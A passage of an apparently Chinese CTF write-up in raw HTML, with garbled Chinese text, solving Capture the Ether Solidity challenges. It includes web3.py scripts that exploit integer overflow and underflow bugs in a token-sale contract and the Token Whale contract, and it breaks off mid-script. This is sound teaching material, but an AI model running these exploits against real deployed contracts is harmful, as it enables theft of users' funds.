class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[key]&quot;</span>))</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line">acct = w3.eth.account.from_key(wallet_private_key)</span><br><span class="line"></span><br><span class="line">min_token_number_with_overflow = <span class="number">2</span> ** <span class="number">256</span> // <span class="number">10</span> ** <span class="number">18</span> + <span class="number">1</span></span><br><span class="line">value = (min_token_number_with_overflow * <span class="number">10</span> ** <span class="number">18</span>) % <span class="number">2</span> ** <span class="number">256</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[*] Buying ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">tx = contract.functions.buy(min_token_number_with_overflow).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span> : value,</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span>,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">signed = acct.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&quot;[+] Bought!&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[*] Selling ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tx = contract.functions.sell(<span class="number">1</span>).buildTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span>,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    signed = acct.signTransaction(tx)</span><br><span class="line">    tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">    receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line">    <span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&quot;[+] Sold!&quot;</span>)</span><br><span class="line">        print(contract.functions.isComplete().call())</span><br><span class="line">        print(<span class="string">&#x27;[+] Solved&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-Token-whale"><a href="#2-Token-whale" class="headerlink" title="2. Token whale"></a>2. Token whale</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This ERC20-compatible token is hard to acquire. Thereâ€™s a fixed supply of 1,000 tokens, all of which are yours to start with.</p><p>Find a way to accumulate at least 1,000,000 tokens to solve this challenge.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name &#x3D; &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol &#x3D; &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals &#x3D; 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player &#x3D; _player;</span><br><span class="line">        totalSupply &#x3D; 1000;</span><br><span class="line">        balanceOf[player] &#x3D; 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;&#x3D; 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line">        require(balanceOf[to] + value &gt;&#x3D; balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] &#x3D; value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;&#x3D; value);</span><br><span class="line">        require(balanceOf[to] + value &gt;&#x3D; balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -&#x3D; value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=cvcA8truev4">Tough Decisions</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>åˆå§‹è´¦æˆ·æœ‰ 1000 ä¸ªtokenï¼Œ é¢˜ç›®è¦æ±‚æˆ‘ä»¬è·å–åˆ° 1000000 token ã€‚ ä¸»è¦äº¤æ˜“å‡½æ•°æœ‰ä¸¤ä¸ª: <code>transfer</code>  ä»¥åŠ<code>transferFrom</code> , è¿™ä¸¤ä¸ªå‡½æ•°æœ€åéƒ½è°ƒç”¨äº† <code>_transfer</code>  ã€‚é€šè¿‡ç®€å•å®¡è®¡æˆ‘ä»¬å‘ç°ï¼Œ <code>_transfer</code>  ä¸­çš„ <code>balanceOf[msg.sender] -= value;</code>  æ˜¯å­˜åœ¨æº¢å‡ºçš„ ã€‚ å¦å¤–æˆ‘ä»¬æ³¨æ„åˆ° <code>transferFrom</code> è¿›è¡Œäº†å¤§å°æ£€ï¼Œ ä½†æ˜¯æ£€æŸ¥çš„æ˜¯ <code>balanceOf[from] &gt;= value</code> , ä½†å®é™…æ‰£æ¬¾çš„æ˜¯  msg.sender , å› æ­¤æ­¤å¤„å­˜åœ¨æ¼æ´é£é™©ã€‚</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li>å‡†å¤‡éœ€è¦ä¸¤ä¸ªè´¦æˆ· ï¼ˆé€šè¿‡ metamask æ–°å»ºä¸€ä¸ªè´¦æˆ·å³å¯ ï¼‰</li><li>é€šè¿‡ <code>transfer</code>  å‘æ–°å»ºçš„è´¦æˆ·è½¬ balanceï¼Œ å¤šè½¬ç‚¹ï¼Œ è®©æ–°è´¦æˆ·çš„ balance å¤šäºä¸»è´¦æˆ·çš„å³å¯</li><li>è°ƒç”¨ <code>approve</code>  è®¾ç½® <code>allowance</code> ,  <code>spender</code> ä¸ºä¸»è´¦æˆ·ï¼Œ<code>value</code> ä¸ºå¤§äºåé¢è¦è½¬çš„å€¼å³å¯ ï¼Œä¾‹å¦‚è®¾ç½®ä¸º 1000</li><li>æœ€åè°ƒç”¨ <code>transferFrom</code> å‡½æ•° <code>from</code>  è®¾ç½®ä¸ºè´¦å· 2ï¼Œ <code>to</code>  è®¾ç½®ä¸ºéä¸»è´¦æˆ·å³å¯ï¼Œ è½¬å…¥ä¸€ä¸ªå€¼è®©å…¶æº¢å‡ºå³å¯ã€‚ </li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;0xDC57892A1058d1e54c9364Ba726BB7643bdA6b2C&quot;</span></span><br><span class="line"></span><br><span class="line">MasterWalt = <span class="string">&quot;0x5b667caAC1E53411D9b87Fc39eEe2F881FDDF589&quot;</span></span><br><span class="line">MasterPrivKey  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">HelpWalt = <span class="string">&quot;0x0cC33CD693bf9BF609e1B7C0E88E34Ff972Afe6f&quot;</span></span><br><span class="line">HelpPrivKey = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;name&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;string&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;spender&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;approve&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;totalSupply&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;from&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;transferFrom&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;decimals&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint8&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;balanceOf&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;symbol&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;string&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;transfer&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;allowance&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;_player&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;anonymous&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;from&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: false,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;Transfer&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;event&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;anonymous&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span 